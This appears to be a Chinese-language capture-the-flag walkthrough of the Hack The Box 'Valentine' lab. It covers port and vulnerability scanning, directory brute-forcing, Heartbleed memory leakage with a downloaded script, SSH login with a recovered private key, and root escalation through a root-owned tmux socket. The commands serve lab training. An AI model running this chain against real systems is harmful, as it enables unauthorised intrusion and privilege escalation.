# HTB Valentine
###### tags: `HTB`

1. 先建立一個nmap資料夾用來存放輸出的結果
```
mkdir nmap
```
![](https://i.imgur.com/B1FP2aC.png)

2. 使用Namp對目標主機進行Port Scan
```
nmap -sC -sV -oA nmap/valentine 10.10.10.79
```
* -sC = equivalent to — script=default
* -sV (版本探测)
* -oA <basename> (輸出至所有格式)

![](https://i.imgur.com/ed5oQWH.png)

* 以使用less指令查看已儲存的輸出結果
```
less nmap/valentine.nmap
```
![](https://i.imgur.com/IUiLgAr.jpg)

3. 嘗試造訪一下80/443 Web Service
* 80 Port
![](https://i.imgur.com/CvGbshm.png)
* 443 Port
![](https://i.imgur.com/PHOc7Uc.png)

* 隱隱約約可以猜到跟Heartbleed有關
* 使用nmap vuln腳本檢查特定的已知漏洞
```
nmap --script vuln -oA nmap/vulnscan 10.10.10.79
```
![](https://i.imgur.com/hf4BoiQ.jpg)
* 結果顯示可能文在HeartBleed漏洞，使用sslyze針對該漏洞做檢查
```
sslyze --heartbleed 10.10.10.79
```
![](https://i.imgur.com/o8YgWGi.png)
4. 使用gobuster查看Web是否有其他隱藏的檔案或文件
```
gobuster -u http://10.10.10.79 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.log -t 50
```
* -U string：Username for Basic Auth (dir mode only)
* -w string：Path to the wordlist
* -t int   ：Number of concurrent threads (default 10)
* -o output：儲存檔案
![](https://i.imgur.com/LF9KJYh.png)
* 造訪dev目錄可以發現一個hype_key檔案
![](https://i.imgur.com/QF0qPMK.png)
* 看起來像是Hex/ASCII編碼，嘗試Decode看看(Hex into ASCII)
![](https://i.imgur.com/kJpmJl0.png)
* 先將Decode內容儲存起來，用Type只能可以得知這是PEM RSA的私鑰
![](https://i.imgur.com/WM3b4Id.png)
5. 有關於Heartbleed漏洞
![](https://i.imgur.com/F6tNdld.png)
* 從GitHub下載腳本
```
git clone https://gist.github.com/eelsivart/10174134
```
![](https://i.imgur.com/Mnj4oZj.png)
* 執行腳本
```
python heartbleed.py 10.10.10.79
```
![](https://i.imgur.com/MbFE5SE.png)
* 修改Payload的大小
![](https://i.imgur.com/FRcIGpV.png)
* 在執行一次腳本，可以發現一個像是Based64編碼的字串
![](https://i.imgur.com/AL91aVX.png)
* 嘗試Decode，可以得到一個新的字串
![](https://i.imgur.com/lc5Fs1q.png)
6. Chmod私鑰檔，並使用ssh到目標主機，嘗試帳號為hype，密碼為Based64解碼後的字串
![](https://i.imgur.com/YE0QE4T.png)
* 成功取得一般User權限
![](https://i.imgur.com/bTq4upp.png)
7. 使用ps aux指令會顯示正在以root用戶身份運行的tmux會話。
```
ps aux |grep root
```
![](https://i.imgur.com/rjPwJsy.png)
* 運行tmux -S /.devs/dev_sess即可以或的Root特權。
```
tmux -S /.devs/dev_sess
```
* 成功取得Flag
![](https://i.imgur.com/NrXKDOY.png)
